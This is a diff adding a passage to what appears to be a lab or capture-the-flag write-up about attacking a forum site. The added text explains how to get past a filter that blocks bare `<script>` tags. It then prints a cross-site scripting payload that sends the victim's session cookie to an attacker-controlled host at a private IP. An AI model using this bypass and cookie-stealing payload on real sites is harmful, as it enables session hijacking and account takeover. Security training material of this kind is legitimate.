@@ -26,4 +26,8 @@ See, every user has the ability to create blogs, and every blog has an access le
 
 Either way, the next step for me was to get one of those fancy moderator accounts. Besides King, one other user had dropped a hint about monitoring the website - "cooldude89", a Moderator user. He had created a thread about politics and religion, and promised to constantly watch it to make sure no trolls derail the debate. Taking this as an invitation for a client side attack, I set about searching for XSS.
 
-Although there is a rudimentary WAF in place, circumventing it didn't take much. The `<script>` tag is filtered out of any post or comment, but all you need to do is include an attribute (i.e. `<script id=test>`) and it will go through.
+Although there is a rudimentary WAF in place, circumventing it didn't take much. The `<script>` tag is filtered out of any post or comment, but all you need to do is include an attribute (i.e. `<script id=test>`) and it will go through. After some tinkering, I deduced that the session cookie is not protected in any way, and that stealing it will let you hijack a user's session - even if they click the logout button. To that end, I crafted the following XSS injection:
+
+`
+<SCRIPT id=test>document.write('<img src="http://192.168.56.1/collect.gif?cookie=' + document.cookie + '" />')</SCRIPT>
+`
